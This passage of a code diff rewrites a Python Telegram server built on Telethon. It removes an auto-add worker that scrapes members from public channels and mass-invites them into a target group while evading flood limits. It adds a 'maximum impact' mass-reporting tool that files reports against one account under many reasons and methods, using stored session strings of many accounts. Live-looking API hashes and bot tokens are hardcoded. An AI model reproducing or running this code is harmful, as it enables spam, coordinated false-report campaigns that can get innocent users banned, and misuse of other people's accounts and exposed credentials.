@@ -1,112 +1,278 @@
 #!/usr/bin/env python3
 """
-Telegram Auto-Add Server - STABLE VERSION
-Each server uses its own unique API credentials
+Telegram Scammer Report System - ENHANCED VERSION
+Automated reporting system to ban/restrict scammers on Telegram
+With session persistence, error recovery, and maximum impact reporting
 """
 
-from flask import Flask, send_file, jsonify, request, redirect, url_for
+from flask import Flask, jsonify, request, redirect, render_template_string, Response
 from flask_cors import CORS
-from telethon import TelegramClient, errors, functions
-from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest, GetParticipantsRequest
-from telethon.tl.functions.contacts import GetContactsRequest
+from telethon import TelegramClient, errors, functions, types
+from telethon.tl.functions.account import ReportPeerRequest
+from telethon.tl.functions.messages import ReportRequest
+from telethon.tl.functions.contacts import BlockRequest
 from telethon.tl.types import (
-    PeerChannel, PeerUser, PeerChat,
-    ChannelParticipantsRecent
+    InputReportReasonSpam,
+    InputReportReasonViolence,
+    InputReportReasonPornography,
+    InputReportReasonChildAbuse,
+    InputReportReasonOther,
+    InputReportReasonFake,
+    InputReportReasonIllegalDrugs,
+    InputReportReasonPersonalDetails,
+    InputReportReasonCopyright,
+    InputPeerUser,
+    InputPeerChannel,
+    InputPeerChat
 )
 from telethon.sessions import StringSession
 import json
 import os
 import asyncio
 import logging
+import logging.handlers
 import time
 import random
 import threading
 import requests
-from datetime import datetime
+from datetime import datetime, timedelta
 from collections import defaultdict
+import traceback
+import sys
+import signal
+import re
+import urllib.parse
+from queue import Queue
+from threading import Lock
 
-# Configure logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+# ============================================
+# LOGGING CONFIGURATION - ENHANCED
+# ============================================
+os.makedirs('logs', exist_ok=True)
+
+# Configure rotating file handler with more backups
+file_handler = logging.handlers.RotatingFileHandler(
+    'logs/server.log',
+    maxBytes=20*1024*1024,  # 20MB
+    backupCount=10
+)
+file_handler.setFormatter(logging.Formatter(
+    '%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s'
+))
+
+console_handler = logging.StreamHandler()
+console_handler.setFormatter(logging.Formatter(
+    '%(asctime)s - %(levelname)s - %(message)s'
+))
+
+logging.basicConfig(
+    level=logging.INFO,
+    handlers=[file_handler, console_handler]
+)
 logger = logging.getLogger(__name__)
 
+# ============================================
+# FLASK APP INITIALIZATION
+# ============================================
 app = Flask(__name__, static_folder=None)
 CORS(app)
 
 # ============================================
-# CHANGE THIS NUMBER ONLY - 1 TO 5
+# CONFIGURATION
 # ============================================
-SERVER_NUMBER = 3  # 1=Dil, 2=sofu, 3=bebby, 4=kaleb, 5=fitsum
-
-SERVERS = {
-    1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedl.onrender.com'},
-    2: {'name': 'sofu', 'api_id': 36274756, 'api_hash': 'b70311a2b3547e1ce40e72081dc726dc', 'url': 'https://sofuu.onrender.com'},
-    3: {'name': 'bebby', 'api_id': 31590358, 'api_hash': '072edc73e0f4003ddcba1c41d24adb02', 'url': 'https://bebby.onrender.com'},
-    4: {'name': 'kaleb', 'api_id': 37539842, 'api_hash': 'a9927e01c5023bf828fe753895d5731b', 'url': 'https://kaleb-bwgb.onrender.com'},
-    5: {'name': 'fitsum', 'api_id': 33441396, 'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95', 'url': 'https://fitsum-ev9d.onrender.com'}
-}
-
-BOT_TOKEN = '7930542124:AAFg5O4KUu7QFORVkxzowtG0nHAiX0yXXBY'
-REPORT_CHAT_ID = '-1002452548749'
-TARGET_GROUP = 'Abe_armygroup'
-
-CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
-SERVER_NAME = CFG['name']
-API_ID = CFG['api_id']
-API_HASH = CFG['api_hash']
-SERVER_URL = CFG['url']
+API_ID = int(os.environ.get('API_ID', '35894551'))
+API_HASH = os.environ.get('API_HASH', '1886fc990cbf114bcd35055dfd300a30')
+BOT_TOKEN = os.environ.get('BOT_TOKEN', '7294379764:AAHAOQ1OVT2TJ0cRAlWhyyxXQdVB3oS9K_A')
 PORT = int(os.environ.get('PORT', 10000))
+SERVER_URL = os.environ.get('SERVER_URL', 'https://accsell.onrender.com')
 
-# File paths
+# ============================================
+# ENHANCED FILE PATHS
+# ============================================
 ACCOUNTS_FILE = 'accounts.json'
-SETTINGS_FILE = 'auto_add_settings.json'
-STATS_FILE = 'stats.json'
-WORKER_ADDS_FILE = 'worker_adds.json'
-SERVER_ADMIN_FILE = 'server_admin.json'
+REPORTS_FILE = 'reports.json'
+REPORT_STATS_FILE = 'report_stats.json'
 TEMP_SESSIONS_FILE = 'temp_sessions.json'
+SESSION_POOL_FILE = 'session_pool.json'
+BLACKLIST_FILE = 'blacklist.json'
 
-# Storage
+# ============================================
+# ENHANCED STORAGE
+# ============================================
 accounts = []
 temp_sessions = {}
-auto_add_settings = {}
-running_tasks = {}
-worker_adds = defaultdict(list)
-server_admin = {}
+reports = []
+session_pool = {}  # Pool of active client connections
+blacklist = set()  # Blacklisted scammers for instant check
+report_stats = {
+    'total_reports': 0,
+    'today_reports': 0,
+    'successful_reports': 0,
+    'failed_reports': 0,
+    'scammers_reported': 0,
+    'last_reset': datetime.now().strftime('%Y-%m-%d'),
+    'report_history': [],
+    'banned_count': 0
+}
+file_lock = threading.Lock()
+session_lock = threading.Lock()
+blacklist_lock = threading.Lock()
 
-stats = {
-    'total_added': 0, 'today_added': 0, 'verified_total': 0, 'verified_today': 0,
-    'last_reset': datetime.now().strftime('%Y-%m-%d'), 'last_verification': None,
-    'daily_history': {}, 'worker_stats': {}, 'dead_accounts_removed': 0,
-    'started_at': datetime.now().isoformat()
+# Report queue for async processing
+report_queue = Queue()
+MAX_QUEUE_SIZE = 1000
+
+# ============================================
+# ENHANCED REPORT REASONS
+# ============================================
+REPORT_REASONS = {
+    'spam': {
+        'name': 'Spam',
+        'icon': '📧',
+        'description': 'Unsolicited messages, advertising, or bulk messaging',
+        'telegram_reason': InputReportReasonSpam(),
+        'priority': 'high'
+    },
+    'fake': {
+        'name': 'Fake Account',
+        'icon': '🎭',
+        'description': 'Impersonating someone else or fake identity',
+        'telegram_reason': InputReportReasonFake(),
+        'priority': 'high'
+    },
+    'violence': {
+        'name': 'Violence',
+        'icon': '⚠️',
+        'description': 'Violent threats or content',
+        'telegram_reason': InputReportReasonViolence(),
+        'priority': 'critical'
+    },
+    'pornography': {
+        'name': 'Inappropriate Content',
+        'icon': '🔞',
+        'description': 'Pornographic or adult content',
+        'telegram_reason': InputReportReasonPornography(),
+        'priority': 'medium'
+    },
+    'drugs': {
+        'name': 'Illegal Drugs',
+        'icon': '💊',
+        'description': 'Selling or promoting illegal drugs',
+        'telegram_reason': InputReportReasonIllegalDrugs(),
+        'priority': 'critical'
+    },
+    'personal': {
+        'name': 'Personal Info',
+        'icon': '🔓',
+        'description': 'Sharing personal information without consent',
+        'telegram_reason': InputReportReasonPersonalDetails(),
+        'priority': 'high'
+    },
+    'copyright': {
+        'name': 'Copyright',
+        'icon': '©️',
+        'description': 'Copyright infringement',
+        'telegram_reason': InputReportReasonCopyright(),
+        'priority': 'medium'
+    },
+    'scam': {
+        'name': 'Scam/Fraud',
+        'icon': '💰',
+        'description': 'Scam attempts, fraud, or financial deception',
+        'telegram_reason': InputReportReasonOther(),
+        'priority': 'critical'
+    },
+    'other': {
+        'name': 'Other',
+        'icon': '📋',
+        'description': 'Other violations',
+        'telegram_reason': InputReportReasonOther(),
+        'priority': 'low'
+    }
 }
 
-OTHER_SERVERS = [
-    {'name': 'Dil', 'num': 1, 'url': 'https://dilbedl.onrender.com'},
-    {'name': 'sofu', 'num': 2, 'url': 'https://sofuu.onrender.com'},
-    {'name': 'bebby', 'num': 3, 'url': 'https://bebby.onrender.com'},
-    {'name': 'kaleb', 'num': 4, 'url': 'https://kaleb-bwgb.onrender.com'},
-    {'name': 'fitsum', 'num': 5, 'url': 'https://fitsum-ev9d.onrender.com'}
-]
-
-# Thread-safe lock for file operations
-file_lock = threading.Lock()
-
+# ============================================
+# ENHANCED FILE OPERATIONS WITH ATOMIC WRITES
+# ============================================
 def load_json(path, default):
+    """Load JSON with backup recovery"""
     try:
         if os.path.exists(path):
             with open(path, 'r') as f:
-                c = f.read().strip()
-                return json.loads(c) if c else default
-    except:
-        pass
+                content = f.read().strip()
+                if content:
+                    data = json.loads(content)
+                    # Create backup
+                    backup_path = f"{path}.backup"
+                    with open(backup_path, 'w') as backup:
+                        json.dump(data, backup, indent=2, default=str)
+                    logger.debug(f"Loaded {len(str(data))} bytes from {path}")
+                    return data
+    except json.JSONDecodeError as e:
+        logger.error(f"Corrupted JSON file {path}: {e}")
+        # Try to restore from backup
+        backup_path = f"{path}.backup"
+        if os.path.exists(backup_path):
+            try:
+                with open(backup_path, 'r') as backup:
+                    logger.info(f"Restoring {path} from backup")
+                    return json.load(backup)
+            except:
+                pass
+    except Exception as e:
+        logger.error(f"Load error {path}: {e}")
     return default
 
 def save_json(path, data):
+    """Save JSON with atomic write operation"""
+    temp_path = f"{path}.tmp"
     with file_lock:
         try:
-            with open(path, 'w') as f:
+            # Write to temp file first
+            with open(temp_path, 'w') as f:
                 json.dump(data, f, indent=2, default=str)
+            # Atomic replace
+            os.replace(temp_path, path)
+            logger.debug(f"Saved {len(str(data))} bytes to {path}")
         except Exception as e:
-            logger.error(f"Save error: {e}")
+            logger.error(f"Save error {path}: {e}")
+            # Try to save directly if atomic write fails
+            try:
+                with open(path, 'w') as f:
+                    json.dump(data, f, indent=2, default=str)
+            except:
+                pass
+
+def load_reports():
+    global reports
+    reports = load_json(REPORTS_FILE, [])
+    logger.info(f"Loaded {len(reports)} reports")
+
+def save_reports():
+    save_json(REPORTS_FILE, reports)
+
+def load_report_stats():
+    global report_stats
+    stats_data = load_json(REPORT_STATS_FILE, {})
+    if stats_data:
+        report_stats.update(stats_data)
+        # Reset daily counter if new day
+        if report_stats.get('last_reset') != datetime.now().strftime('%Y-%m-%d'):
+            report_stats['today_reports'] = 0
+            report_stats['last_reset'] = datetime.now().strftime('%Y-%m-%d')
+            logger.info("Reset daily report counter")
+
+def save_report_stats():
+    save_json(REPORT_STATS_FILE, report_stats)
+
+def load_blacklist():
+    global blacklist
+    blacklist_data = load_json(BLACKLIST_FILE, [])
+    blacklist = set(blacklist_data)
+    logger.info(f"Loaded {len(blacklist)} blacklisted scammers")
+
+def save_blacklist():
+    save_json(BLACKLIST_FILE, list(blacklist))
 
 def save_temp_sessions():
     sessions_data = {}
@@ -115,418 +281,560 @@ def save_temp_sessions():
             'phone': session_data['phone'],
             'hash': session_data['hash'],
             'session': session_data['session'],
+            'code_attempts': session_data.get('code_attempts', 0),
             'password_attempts': session_data.get('password_attempts', 0),
-            'code_attempts': session_data.get('code_attempts', 0)
+            'created_at': session_data.get('created_at', time.time()),
+            'telegram_id': session_data.get('telegram_id', ''),
+            'first_name': session_data.get('first_name', ''),
+            'last_name': session_data.get('last_name', ''),
+            'username': session_data.get('username', '')
         }
     save_json(TEMP_SESSIONS_FILE, sessions_data)
 
 def load_temp_sessions():
+    global temp_sessions
     sessions_data = load_json(TEMP_SESSIONS_FILE, {})
+    temp_sessions = {}
+    current_time = time.time()
+    expired_count = 0
     for session_id, session_data in sessions_data.items():
-        temp_sessions[session_id] = {
-            'phone': session_data['phone'],
-            'hash': session_data['hash'],
-            'session': session_data['session'],
-            'password_attempts': session_data.get('password_attempts', 0),
-            'code_attempts': session_data.get('code_attempts', 0)
-        }
+        created_at = session_data.get('created_at', 0)
+        if current_time - created_at < 7200:  # 2 hour expiry
+            temp_sessions[session_id] = session_data
+        else:
+            expired_count += 1
+    if expired_count:
+        logger.info(f"Cleaned {expired_count} expired sessions")
+    save_temp_sessions()
 
 # ============================================
-# ACCOUNT AGE DETECTION - FIXED
+# ENHANCED SESSION POOL MANAGEMENT
 # ============================================
-def get_account_age(client):
-    """Get account age - runs within existing event loop context"""
-    try:
-        # Check if we're already in an event loop
-        try:
-            loop = asyncio.get_event_loop()
-            if loop.is_running():
-                # We're inside a running loop, need to use a different approach
-                import concurrent.futures
-                with concurrent.futures.ThreadPoolExecutor() as executor:
-                    future = executor.submit(_get_account_age_sync, client)
-                    return future.result(timeout=15)
-        except RuntimeError:
-            pass
+class SessionPool:
+    """Manages persistent client connections"""
+    def __init__(self):
+        self.pool = {}
+        self.lock = Lock()
+        self.max_connections_per_account = 3
         
-        # No running loop, we can safely run
-        return _get_account_age_sync(client)
+    def get_client(self, session_string, phone=''):
+        """Get or create a client from the pool"""
+        key = phone or session_string[:20]
         
-    except Exception as e:
-        logger.error(f"Error getting account age: {e}")
-        return {
-            'creation_date': 'Error',
-            'age_days': None,
-            'age_years': None,
-            'age_display': 'Could not determine',
-            'year_joined': None,
-            'method': 'error',
-            'error': str(e)
-        }
-
-def _get_account_age_sync(client):
-    """Synchronous helper for getting account age"""
-    async def _async_get_age():
-        try:
-            me = await client.get_me()
+        with self.lock:
+            # Return existing connection if available
+            if key in self.pool:
+                client, last_used = self.pool[key]
+                if time.time() - last_used < 300:  # 5 minute reuse
+                    self.pool[key] = (client, time.time())
+                    return client
+                else:
+                    # Connection expired, create new
+                    del self.pool[key]
             
-            # Method 1: Check creation_date from user object
-            if hasattr(me, 'creation_date') and me.creation_date:
-                creation_date = me.creation_date
-                if hasattr(creation_date, 'tzinfo') and creation_date.tzinfo:
-                    creation_date = creation_date.replace(tzinfo=None)
-                age_days = (datetime.now() - creation_date).days
-                age_years = age_days / 365.25
-                return {
-                    'creation_date': creation_date.isoformat(),
-                    'age_days': age_days,
-                    'age_years': round(age_years, 1),
-                    'age_display': f"{int(age_years)} years, {age_days % 365} days",
-                    'year_joined': creation_date.year,
-                    'method': 'creation_date'
-                }
-            
-            # Method 2: Check oldest profile photo
-            try:
-                photos = await client.get_profile_photos(me, limit=1)
-                if photos and len(photos) > 0:
-                    oldest_photo_date = photos[0].date
-                    if hasattr(oldest_photo_date, 'tzinfo') and oldest_photo_date.tzinfo:
-                        oldest_photo_date = oldest_photo_date.replace(tzinfo=None)
-                    age_days = (datetime.now() - oldest_photo_date).days
-                    return {
-                        'creation_date': oldest_photo_date.isoformat(),
-                        'age_days': age_days,
-                        'age_years': round(age_days / 365.25, 1),
-                        'age_display': f"~{int(age_days / 365.25)} years",
-                        'year_joined': oldest_photo_date.year,
-                        'method': 'oldest_photo'
-                    }
-            except:
-                pass
-            
-            # Method 3: Try to get account age from API
-            try:
-                full_user = await client(functions.users.GetFullUserRequest(me))
-                if full_user and hasattr(full_user, 'full_user'):
-                    fu = full_user.full_user
-                    logger.info(f"Full user info available for age detection")
-            except:
-                pass
-            
-            return {
-                'creation_date': 'Unknown',
-                'age_days': None,
-                'age_years': None,
-                'age_display': 'Unknown account age',
-                'year_joined': None,
-                'method': 'unknown'
-            }
-        except Exception as e:
-            logger.error(f"Async age detection error: {e}")
-            return {
-                'creation_date': 'Error',
-                'age_days': None,
-                'age_years': None,
-                'age_display': 'Error detecting age',
-                'year_joined': None,
-                'method': 'error',
-                'error': str(e)
-            }
+            # Create new client
+            client = TelegramClient(
+                StringSession(session_string), 
+                API_ID, 
+                API_HASH,
+                connection_retries=10,
+                retry_delay=3,
+                timeout=30,
+                auto_reconnect=True
+            )
+            self.pool[key] = (client, time.time())
+            return client
     
-    # Create new event loop in this thread
+    def cleanup(self):
+        """Remove expired connections"""
+        with self.lock:
+            current_time = time.time()
+            expired = [
+                key for key, (_, last_used) in self.pool.items()
+                if current_time - last_used > 600  # 10 minute expiry
+            ]
+            for key in expired:
+                del self.pool[key]
+            if expired:
+                logger.info(f"Cleaned {len(expired)} pool connections")
+
+# Initialize session pool
+session_pool = SessionPool()
+
+# ============================================
+# ENHANCED EVENT LOOP MANAGEMENT
+# ============================================
+def get_or_create_eventloop():
+    """Get or create event loop with retry"""
     try:
+        loop = asyncio.get_event_loop()
+        if loop.is_closed():
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+        return loop
+    except RuntimeError:
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        result = loop.run_until_complete(_async_get_age())
-        loop.close()
-        return result
-    except Exception as e:
-        logger.error(f"Loop error in age detection: {e}")
-        return {
-            'creation_date': 'Error',
-            'age_days': None,
-            'age_years': None,
-            'age_display': 'Could not determine',
-            'year_joined': None,
-            'method': 'error',
-            'error': str(e)
-        }
+        return loop
 
 # ============================================
-# SIMPLE SYNC WRAPPER
+# ENHANCED TELEGRAM CLIENT HELPER
 # ============================================
-def run_telethon_task(async_func, timeout=60):
-    loop = asyncio.new_event_loop()
-    try:
-        result = loop.run_until_complete(async_func())
-        return result
-    except Exception as e:
-        logger.error(f"Telethon task error: {e}")
-        raise
-    finally:
-        loop.close()
-
-def get_client(acc):
-    return TelegramClient(
-        StringSession(acc['session']), API_ID, API_HASH,
-        connection_retries=3, retry_delay=1, timeout=30
-    )
-
-def reset_daily():
-    today = datetime.now().strftime('%Y-%m-%d')
-    if stats.get('last_reset') != today:
-        stats['today_added'] = 0
-        stats['verified_today'] = 0
-        stats['last_reset'] = today
-        for k in stats.get('worker_stats', {}):
-            stats['worker_stats'][k]['today'] = 0
-            stats['worker_stats'][k]['verified_today'] = 0
-        save_json(STATS_FILE, stats)
-
-def check_account_auth(acc):
-    async def _check():
-        client = get_client(acc)
-        await client.connect()
-        try:
-            return await client.is_user_authorized()
-        finally:
-            await client.disconnect()
+class SyncTelegramClient:
+    @staticmethod
+    def run_async(async_func, timeout=120, retries=3):
+        """Run async function with retry logic"""
+        for attempt in range(retries + 1):
+            try:
+                loop = get_or_create_eventloop()
+                result = loop.run_until_complete(
+                    asyncio.wait_for(async_func(), timeout=timeout)
+                )
+                return result
+            except asyncio.TimeoutError:
+                logger.warning(f"Async timeout on attempt {attempt + 1}/{retries + 1}")
+                if attempt == retries:
+                    raise
+                time.sleep(2 * (attempt + 1))
+            except Exception as e:
+                logger.error(f"Async execution error (attempt {attempt + 1}): {e}")
+                if attempt == retries:
+                    raise
+                time.sleep(2 * (attempt + 1))
     
-    try:
-        return run_telethon_task(_check, timeout=15)
-    except:
+    @staticmethod
+    def get_client(session_string, phone=''):
+        """Get client from pool or create new"""
+        return session_pool.get_client(session_string, phone)
+    
+    @staticmethod
+    async def safe_connect(client, max_retries=3):
+        """Connect with retry logic"""
+        for attempt in range(max_retries):
+            try:
+                await asyncio.wait_for(client.connect(), timeout=15)
+                return True
+            except Exception as e:
+                logger.warning(f"Connection attempt {attempt + 1} failed: {e}")
+                if attempt == max_retries - 1:
+                    return False
+                await asyncio.sleep(2 ** attempt)
         return False
 
-def remove_dead_account(aid, reason=""):
-    global accounts
-    acc = next((a for a in accounts if a['id'] == aid), None)
-    name = acc.get('name', str(aid)) if acc else str(aid)
-    
-    accounts = [a for a in accounts if a['id'] != aid]
-    auto_add_settings.pop(str(aid), None)
-    running_tasks.pop(str(aid), None)
-    worker_adds.pop(str(aid), None)
-    
-    save_json(ACCOUNTS_FILE, accounts)
-    save_json(SETTINGS_FILE, auto_add_settings)
-    save_json(WORKER_ADDS_FILE, dict(worker_adds))
-    
-    stats['dead_accounts_removed'] = stats.get('dead_accounts_removed', 0) + 1
-    save_json(STATS_FILE, stats)
-    
-    logger.warning(f"Removed dead account: {name} | Reason: {reason}")
-    try:
-        send_telegram(f"<b>{SERVER_NAME}</b>\nRemoved: {name}\nReason: {reason}")
-    except:
-        pass
-    return name
-
-def send_telegram(text):
-    try:
-        requests.post(
-            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
-            json={'chat_id': REPORT_CHAT_ID, 'text': text, 'parse_mode': 'HTML'},
-            timeout=10
-        )
-    except Exception as e:
-        logger.error(f"Send telegram error: {e}")
-
 # ============================================
-# AUTO-ADD WORKER - WITH MULTIPLE TARGET SUPPORT
+# ENHANCED SCAMMER RESOLVER
 # ============================================
-def auto_add_worker(account):
-    acc_id = account['id']
-    acc_key = str(acc_id)
-    attempted = set()
-    joined_targets = set()
-    cycle_count = 0
+def resolve_scammer_entity(client, identifier):
+    """Resolve scammer with multiple methods"""
+    identifier = identifier.strip()
     
-    # Target groups - primary and secondary
-    TARGET_GROUPS = ['Abe_armygroup', 'abe_army']
-    
-    logger.info(f"AUTO-ADD STARTED: {account.get('name')} -> Groups: {TARGET_GROUPS}")
-    
-    while True:
+    async def _resolve():
+        # Method 1: Direct username lookup
+        if identifier.startswith('@'):
+            username = identifier[1:]
+        else:
+            username = identifier
+        
         try:
-            settings = auto_add_settings.get(acc_key, {})
-            if not settings.get('enabled', True):
-                time.sleep(10)
-                continue
+            entity = await client.get_entity(username)
+            if entity:
+                logger.info(f"Resolved via username: {username}")
+                return entity
+        except:
+            pass
+        
+        # Method 2: Phone number lookup
+        phone = identifier.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
+        if not phone.startswith('+'):
+            phone = '+' + phone
+        
+        try:
+            # Import contact method
+            contact = await client(functions.contacts.ImportContactsRequest([
+                types.InputPhoneContact(
+                    client_id=0,
+                    phone=phone,
+                    first_name="Report",
+                    last_name="Target"
+                )
+            ]))
             
-            reset_daily()
+            if contact.users:
+                user = contact.users[0]
+                logger.info(f"Resolved via phone import: {phone}")
+                return user
+        except:
+            pass
+        
+        # Method 3: Direct phone entity
+        try:
+            entity = await client.get_entity(phone)
+            if entity:
+                logger.info(f"Resolved via phone entity: {phone}")
+                return entity
+        except:
+            pass
+        
+        # Method 4: Search by display name
+        try:
+            result = await client(functions.contacts.SearchRequest(
+                q=identifier,
+                limit=10
+            ))
+            if result.users:
+                # Return first matching user
+                user = result.users[0]
+                logger.info(f"Resolved via search: {identifier}")
+                return user
+        except:
+            pass
+        
+        logger.warning(f"Could not resolve scammer: {identifier}")
+        return None
+    
+    return SyncTelegramClient.run_async(_resolve, timeout=30)
+
+# ============================================
+# ENHANCED REPORT FUNCTION - MAXIMUM IMPACT
+# ============================================
+def report_scammer_max_impact(session_string, scammer_identifier, reasons, message="", phone=''):
+    """Report scammer with maximum impact using all available methods"""
+    
+    async def _report():
+        client = SyncTelegramClient.get_client(session_string, phone)
+        
+        try:
+            if not await SyncTelegramClient.safe_connect(client):
+                return {'success': False, 'error': 'Failed to connect to Telegram'}
             
+            if not await client.is_user_authorized():
+                return {'success': False, 'error': 'Account not authorized'}
+            
+            # Resolve scammer
+            scammer = await resolve_scammer_entity(client, scammer_identifier)
+            
+            if not scammer:
+                return {
+                    'success': False, 
+                    'error': f'Could not find user: {scammer_identifier}'
+                }
+            
+            # Collect scammer info
+            scammer_info = {
+                'id': str(scammer.id),
+                'username': getattr(scammer, 'username', ''),
+                'phone': getattr(scammer, 'phone', ''),
+                'first_name': getattr(scammer, 'first_name', ''),
+                'last_name': getattr(scammer, 'last_name', ''),
+                'is_scam': getattr(scammer, 'scam', False),
+                'is_fake': getattr(scammer, 'fake', False)
+            }
+            
+            results = []
+            total_success = 0
+            
+            # Report with EACH reason using MULTIPLE methods
+            for reason_key in reasons:
+                reason_data = REPORT_REASONS.get(reason_key)
+                if not reason_data:
+                    continue
+                
+                telegram_reason = reason_data['telegram_reason']
+                reason_name = reason_data['name']
+                
+                # Method 1: Report via account.report_peer (most effective)
+                try:
+                    await client(functions.account.ReportPeerRequest(
+                        peer=scammer,
+                        reason=telegram_reason,
+                        message=f"URGENT: {reason_name} violation. {message}" if message else f"URGENT: {reason_name} violation"
+                    ))
+                    results.append({'method': 'report_peer', 'reason': reason_key, 'status': 'success'})
+                    logger.info(f"✅ [report_peer] Reported for {reason_name}")
+                except errors.FloodWaitError as e:
+                    logger.warning(f"⏳ Flood wait {e.seconds}s")
+                    await asyncio.sleep(min(e.seconds, 10))
+                except Exception as e:
+                    logger.error(f"❌ [report_peer] Failed: {e}")
+                
+                # Method 2: Report via messages.report
+                try:
+                    await client(functions.messages.ReportRequest(
+                        peer=scammer,
+                        id=[0],
+                        reason=telegram_reason,
+                        message=f"URGENT REPORT: {reason_name}. {message}" if message else f"URGENT REPORT: {reason_name}"
+                    ))
+                    results.append({'method': 'messages_report', 'reason': reason_key, 'status': 'success'})
+                    logger.info(f"✅ [messages.report] Reported for {reason_name}")
+                except errors.FloodWaitError as e:
+                    await asyncio.sleep(min(e.seconds, 10))
+                except Exception as e:
+                    logger.error(f"❌ [messages.report] Failed: {e}")
+                
+                # Method 3: Block the user (additional signal)
+                try:
+                    await client(functions.contacts.BlockRequest(scammer))
+                    results.append({'method': 'block', 'reason': reason_key, 'status': 'success'})
+                    logger.info(f"✅ Blocked scammer")
+                except:
+                    pass
+                
+                # Method 4: Report spam from chat (if applicable)
+                try:
+                    await client(functions.messages.ReportSpamRequest(
+                        peer=scammer
+                    ))
+                    results.append({'method': 'report_spam', 'reason': reason_key, 'status': 'success'})
+                    logger.info(f"✅ Report spam")
+                except:
+                    pass
+                
+                total_success += 1
+                
+                # Small delay between reports to avoid flood
+                await asyncio.sleep(random.uniform(0.5, 1.5))
+            
+            # Mark as scam in contacts
             try:
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
-                
-                client = get_client(account)
-                loop.run_until_complete(client.connect())
-                
-                if not loop.run_until_complete(client.is_user_authorized()):
-                    logger.error(f"Account {acc_id} not authorized")
-                    loop.run_until_complete(client.disconnect())
-                    loop.close()
-                    remove_dead_account(acc_id, "Not authorized")
-                    break
-                
-                me = loop.run_until_complete(client.get_me())
-                worker_name = me.first_name or 'User'
-                
-                # Join all target groups
-                for target in TARGET_GROUPS:
-                    if target not in joined_targets:
-                        try:
-                            grp = loop.run_until_complete(client.get_entity(target))
-                            loop.run_until_complete(client(JoinChannelRequest(grp)))
-                            joined_targets.add(target)
-                            logger.info(f"{worker_name} joined {target}")
-                            send_telegram(f"<b>{SERVER_NAME}</b>\n✅ {worker_name} joined {target}")
-                        except Exception as e:
-                            if 'already' in str(e).lower() or 'participant' in str(e).lower():
-                                joined_targets.add(target)
-                                logger.info(f"Already in {target}")
-                            else:
-                                logger.warning(f"Could not join {target}: {e}")
-                
-                # Primary target for adding members
-                primary_target = TARGET_GROUPS[0]
-                group = loop.run_until_complete(client.get_entity(primary_target))
-                
-                # Also join secondary target if needed for member sourcing
-                secondary_target = TARGET_GROUPS[1] if len(TARGET_GROUPS) > 1 else None
-                
-                all_ids = set()
-                
-                try:
-                    contacts = loop.run_until_complete(client(GetContactsRequest(0)))
-                    for c in contacts.users:
-                        if c.id and not c.bot:
-                            all_ids.add(c.id)
-                except:
-                    pass
-                
-                try:
-                    dialogs = loop.run_until_complete(client.get_dialogs(limit=500))
-                    for d in dialogs:
-                        if d.is_user and d.entity and d.entity.id and not getattr(d.entity, 'bot', False):
-                            all_ids.add(d.entity.id)
-                except:
-                    pass
-                
-                source_groups = ['@telegram', '@durov', '@TelegramTips', '@contest', '@TelegramNews',
-                                 '@builders', '@Android', '@iOS', '@Python', '@programming', '@abe_army']
-                for sg in source_groups:
-                    try:
-                        entity = loop.run_until_complete(client.get_entity(sg))
-                        participants = loop.run_until_complete(client.get_participants(entity, limit=300))
-                        for user in participants:
-                            if user.id and not user.bot:
-                                all_ids.add(user.id)
-                        time.sleep(1)
-                    except:
-                        pass
-                
-                logger.info(f"Total unique IDs: {len(all_ids)}")
-                
-                fresh = [uid for uid in all_ids if uid not in attempted]
-                if len(fresh) < 50:
-                    attempted.clear()
-                    fresh = list(all_ids)
-                
-                random.shuffle(fresh)
-                cycle_count += 1
-                added_this_cycle = 0
-                delay = max(25, settings.get('delay_seconds', 25))
-                
-                for uid in fresh[:500]:
-                    settings_check = auto_add_settings.get(acc_key, {})
-                    if not settings_check.get('enabled', True):
-                        break
-                    
-                    attempted.add(uid)
-                    
-                    try:
-                        user_input = loop.run_until_complete(client.get_input_entity(uid))
-                        loop.run_until_complete(client(InviteToChannelRequest(group, [user_input])))
-                        
-                        add_record = {
-                            'user_id': uid, 'time': datetime.now().isoformat(),
-                            'added_by': worker_name, 'worker_id': acc_id
-                        }
-                        worker_adds[acc_key].append(add_record)
-                        
-                        stats['today_added'] = stats.get('today_added', 0) + 1
-                        stats['total_added'] = stats.get('total_added', 0) + 1
-                        
-                        if acc_key not in stats['worker_stats']:
-                            stats['worker_stats'][acc_key] = {'total': 0, 'today': 0, 'verified_total': 0, 'verified_today': 0}
-                        stats['worker_stats'][acc_key]['today'] += 1
-                        stats['worker_stats'][acc_key]['total'] += 1
-                        
-                        added_this_cycle += 1
-                        
-                        actual_delay = random.uniform(delay * 0.8, delay * 1.2)
-                        time.sleep(actual_delay)
-                        
-                    except errors.FloodWaitError as e:
-                        wait_time = min(e.seconds + random.randint(5, 15), 300)
-                        logger.warning(f"Flood wait {wait_time}s")
-                        time.sleep(wait_time)
-                    except (errors.UserPrivacyRestrictedError, errors.UserNotMutualContactError,
-                            errors.UserAlreadyParticipantError, errors.UserKickedError,
-                            errors.UserBannedInChannelError):
-                        continue
-                    except errors.rpcerrorlist.AuthKeyUnregisteredError:
-                        logger.error(f"Auth key unregistered for {acc_id}")
-                        loop.run_until_complete(client.disconnect())
-                        loop.close()
-                        remove_dead_account(acc_id, "Auth key unregistered")
-                        return
-                    except Exception:
-                        continue
-                    
-                    if added_this_cycle % 20 == 0:
-                        save_json(STATS_FILE, stats)
-                        save_json(WORKER_ADDS_FILE, dict(worker_adds))
-                
-                logger.info(f"Cycle {cycle_count}: +{added_this_cycle} | Today: {stats['today_added']} | Total: {stats['total_added']}")
-                save_json(STATS_FILE, stats)
-                save_json(WORKER_ADDS_FILE, dict(worker_adds))
-                
-                loop.run_until_complete(client.disconnect())
-                loop.close()
-                
-            except errors.rpcerrorlist.AuthKeyUnregisteredError:
-                logger.error(f"Auth key unregistered for account {acc_id}")
